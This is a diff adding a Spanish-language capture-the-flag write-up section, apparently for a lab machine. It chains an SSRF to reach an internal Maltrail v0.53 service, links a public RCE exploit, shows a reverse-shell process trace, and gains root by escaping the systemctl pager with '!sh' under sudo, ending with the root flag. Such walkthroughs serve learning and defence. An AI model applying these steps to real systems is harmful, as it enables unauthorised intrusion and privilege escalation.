@@ -242,3 +242,62 @@ Aparece el index creado, y el sitio internamente procesa la solicitud.
 
 <figure><img src="../../../.gitbook/assets/hola.png" alt=""><figcaption></figcaption></figure>
 
+Devido a que no se sabe bien si el port 80 esta aboerto con el paso anteriro podemos probar 127.0.1:80 http://127.0.0.1:80/ http://10.10.11.224:55555/ufz0o5s/ agrego una /&#x20;
+
+<figure><img src="../../../.gitbook/assets/loginm.png" alt=""><figcaption></figcaption></figure>
+
+sevicio web interno version Maltrail (v0.53) encontre un exploit es vulnerable a RCE https://github.com/josephberger/Maltrail-v0.53-RCE
+
+<figure><img src="../../../.gitbook/assets/exploit.png" alt=""><figcaption></figcaption></figure>
+
+Realizamos la busqueda de la primer bandera ,luego se eso hacemos un sudo -l
+
+```bash
+sudo -l
+Matching Defaults entries for puma on sau:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+Podemos ver que se puede ejecutar un servicio sin ser root.
+
+```
+sudo /usr/bin/systemctl status trail.service
+sudo /usr/bin/systemctl status trail.service
+WARNING: terminal is not fully functional
+-  (press RETURN)
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor p
+     Active: active (running) since Sun 2024-01-14 13:14:51 UTC; 2h 54min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 894 (python3)
+      Tasks: 41 (limit: 4662)
+     Memory: 76.0M
+     CGroup: /system.slice/trail.service
+             ├─ 894 /usr/bin/python3 server.py
+             ├─2538 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed p>
+             ├─2539 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed p>
+             ├─2542 bash
+             ├─2543 bash -i
+             ├─2550 python3 -c import pty;pty.spawn("/bin/bash")
+             ├─2551 /bin/bash
+             ├─2560 sudo /usr/bin/systemctl status trail.service
+             ├─2561 /usr/bin/systemctl status trail.service
+             ├─2562 pager
+             ├─2588 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed p>
+             ├─2589 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed p>
+             ├─2592 bash
+             ├─2593 bash -i
+!sh 
+whoami
+root
+navegamos a la carpeta root
+y tenemos la ultima bandera
+cat root.txt
+16e730314fd6e56f5d6162992f06cfe3
+
+```
